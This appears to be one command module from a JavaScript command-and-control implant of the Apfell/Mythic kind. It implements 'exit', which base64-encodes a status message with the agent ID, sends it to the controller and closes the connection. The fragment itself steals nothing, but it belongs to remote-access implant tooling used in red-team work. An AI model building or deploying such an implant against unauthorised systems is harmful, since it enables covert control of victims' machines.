exit = function(task) {
    response = {"task_id":task['task_id'], "user_output":"exiting", "completed": true};
    outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
    enc = JSON.stringify(outer_response);
    final = apfell.apfellid + enc;
    msg = btoa(unescape(encodeURIComponent(final)));
    meta = {
        "data": msg,
        "client": true,
        "tag":"",
    };

    connection.send(meta);
    setTimeout(function name(params) {
        connection.close();
    }, C2.interval);
}

C2.commands[exit.name] = exit;
COMMAND_ENDS_HERE